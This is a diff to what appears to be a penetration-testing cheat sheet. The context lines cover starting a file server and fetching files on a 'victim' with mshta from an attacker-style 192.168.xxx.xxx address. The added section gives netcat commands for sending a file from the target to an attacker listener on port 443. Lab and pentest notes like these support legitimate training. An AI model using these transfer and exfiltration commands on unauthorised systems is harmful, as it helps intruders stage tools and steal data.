@@ -177,7 +177,7 @@ Fix shell:<br/>
 export PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
 /games"PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr`<br/>
 
-## File transfer:
+## File transfer, upload to target:
 Start web server in the current directory on port 80:<br/>
 `python3 -m http.server 80`<br/>
 Upload from victim:<br/>
@@ -193,6 +193,12 @@ over http:<br/>
 `mshta http://192.168.xxx.xxx/some_file`<br/>
 over ftp:<br/>
 `mshta ftp://192.168.xxx.xxx/some_file`<br/>
+## File transfer, download to attacker:
+Upload nc.exe to target<br/>
+Command on attacker: `nc -lvp 443 > report.html`<br/>
+Command on target: `nc.exe 192.168.xxx.xxx 443 -w 3 < report.html`<br/>
+
+
 ## compile code:
 Exploit mostly written in c.<br/>
 `gcc -o exploit EXPLOIT.c `<br/>
